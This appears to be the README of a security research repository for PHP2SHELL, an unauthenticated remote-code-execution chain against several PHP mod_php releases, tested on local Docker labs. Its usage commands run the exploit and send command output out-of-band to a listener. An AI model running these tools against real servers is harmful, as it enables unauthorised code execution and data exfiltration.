# PHP2SHELL — engine-level RCE on PHP 8.2.34 / 8.3.29 / 8.3.35 / 8.4.26 mod_php

Research lab and exploit for **CVE-2026-109618 / CVE-2026-109619**
on stock `php:<version>-apache` images. The chain is engine-level: it drives
the session upload-progress callback before RINIT and reaches `zif_system`
through a forged `zend_reference` / `zend_array` destructor. No application
PHP and no authentication are required.

The engine chain is proven end-to-end on **8.2.34**, **8.3.29**, **8.3.35**,
and **8.4.26**; **8.2.35** and **8.3.36** are fixed-release negative controls.
8.3.35 is the last affected 8.3 release and forms an adjacent
vulnerable/fixed pair with 8.3.36. 8.5.11 is parked after the A1 primitive
was confirmed but the B1 leak was not calibrated. The full matrix,
parameters, and evidence links are in [`VERSIONS.md`](VERSIONS.md).

**Status:** working on the local Docker lab. Single-worker execution, a
bounded four-worker prefork pool, out-of-band command output (`--oob`), and
TLS through a raw TCP-level terminator (`--https`) are validated on 8.4.26.
The multi-build URL-only driver is validated on 8.2.34, 8.3.29, 8.3.35, and
8.4.26. The full findings, evidence, and limitations are in
[`REPORT.md`](REPORT.md) (8.4.26) and [`VERSIONS.md`](VERSIONS.md)
(multi-build).

**Primary deliverables:** [`oneshot-8426/exploit.py`](oneshot-8426/exploit.py)
(URL-only, calibrated 8.2/8.3/8.4 profiles, including 8.3.35) and
[`official-lab/pure_shell.py`](official-lab/pure_shell.py) (8.4 interactive
engine).

## Advisory boundary

PHP fixed both CVEs in **8.2.35, 8.3.36, 8.4.27, and 8.5.12**. The CVE
records give the affected branches as `8.2.* < 8.2.35`,
`8.3.* < 8.3.36`, `8.4.* < 8.4.27`, and `8.5.* < 8.5.12`. This repository
proves the engine chain on 8.2.34, 8.3.29, 8.3.35, and 8.4.26, and tests
8.2.35 and 8.3.36 as fixed-release negative controls. 8.4.27 is covered by
the driver gate but is not lab-tested in this update; 8.5.11 is parked. The
8.3.35/8.3.36 pair is adjacent: the full chain succeeds on 8.3.35 and the
A1 arming signature is absent on 8.3.36. The repository does not claim
every affected release is calibrated: uncalibrated affected builds are
either best-effort with a branch profile or not attempted.

Sources: [PHP advisory](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
[GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
[CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618),
[CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619).

## Layout

| Path | Contents |
|---|---|
| `oneshot-8426/` | Multi-build URL-only driver (`exploit.py`), engine (`pure_shell.py`), payload builders, 8.2/8.3/8.4 profiles |
| `lab-8234/` | 8.2.34 proof: result, lab bootstrap, evidence, six chain executions |
| `lab-8235/` | 8.2.35 fixed-release negative control |
| `lab-8329/` | 8.3.29 proof: result, lab bootstrap, calibration notes, eight chain executions |
| `lab-8335/` | 8.3.35 proof: last affected 8.3 release, ten chain executions across six ASLR layouts |
| `lab-8336/` | 8.3.36 fixed-release negative control |
| `official-lab/` | Stock 8.4.26 target, interactive tool, A1/B1/A2/B2 chain, multi-worker/TLS/OOB modes, evidence |
| `modphp-lab/` | 8.3.33 mod_php supporting port (application precondition) |
| `fpm-lab/` | 8.3.35 FPM supporting port (application precondition) |
| `VERSIONS.md` | Multi-build matrix, per-build parameters, image and engine hashes |
| `REPORT.md` | Consolidated 8.4.26 report: findings, chain, evidence manifest, limits |

The stock-target claims are the `lab-8234/`, `lab-8329/`, `lab-8335/`, and
`official-lab/` results; `lab-8235/` and `lab-8336/` are fixed-release
negative controls. The `modphp-lab/` 8.3.33 and `fpm-lab/` 8.3.35 ports are
reported separately because each needs an application-side sink
(`unserialize` or a session-write endpoint); they are not part of the
stock-target claim.

## Quick start

Multi-build one-shot (8.2.34 / 8.3.29 / 8.3.35 / 8.4.26):

```bash
# 8.2.34 lab (lab-8329 is 8.3.29; lab-8335 is 8.3.35; official-lab is 8.4.26)
cd lab-8234
./run.sh
cd ..
python3 oneshot-8426/exploit.py
# paste http://127.0.0.1:18134/index.php, then a command such as: id
```

8.4 interactive reference:

```bash
cd official-lab
./run.sh
python3 pure_shell.py --exec 'id'
```

Other validated 8.4 paths:

```bash
# runtime address resolution only
python3 pure_shell.py --leak

# bounded four-worker pool
./run_multi.sh
python3 pure_shell.py --port 18112 --multi --outdir multi-out --exec 'id'

# out-of-band output
./experiments/run_oob_listener.sh
python3 pure_shell.py --oob 'http://<listener-ip>:18999/' --exec 'id'

# TLS through a raw TCP-level terminator
python3 experiments/tls_tcp_forward.py \
  --cert docker/tls/cert.pem --key docker/tls/key.pem \
  --port 18444 --target-port 18110 &
python3 pure_shell.py --port 18444 --https --insecure \
  --oob 'http://<listener-ip>:18999/' --exec 'id'
```

The complete command reference, target profile, offsets, and evidence map are
in [`official-lab/README.md`](official-lab/README.md),
[`official-lab/CALIBRATION.md`](official-lab/CALIBRATION.md), and
[`official-lab/EVIDENCE.md`](official-lab/EVIDENCE.md).

## Scope

- All runs in this repository are against local Docker targets. The repo
  ships no live-target list and no live-target automation; the multi-build
  driver is validated against the labs above only.
- 8.5.11 is parked: the A1 primitive is confirmed locally, but the B1 leak
  is not calibrated, so no 8.5 exploitation result is claimed or published.
- The working workspace's third-party clones (`exploits/`, `repos/`), live
  probe tooling (`tools/`), CMS target lists, and the 8.0.30 calibration
  scratch notes are intentionally excluded. This repository contains the
  PHP2SHELL lab code, docs, and evidence.
- The 9bie reference clone is external. Two reference-reproduction commands
  in `CALIBRATION.md` and `EVIDENCE.md` point at `../exploits/9bie-latest`;
  the core tool and all stock-target runs do not need it.
- Test TLS key material is not committed. `official-lab/README.md` regenerates
  it with `openssl`.

## Credits

- 9bie's public PHP2SHELL ASLR research and reference exploit.
- `de0`'s payload generators vendored under `official-lab/payloads/` and
  attributed in their headers.
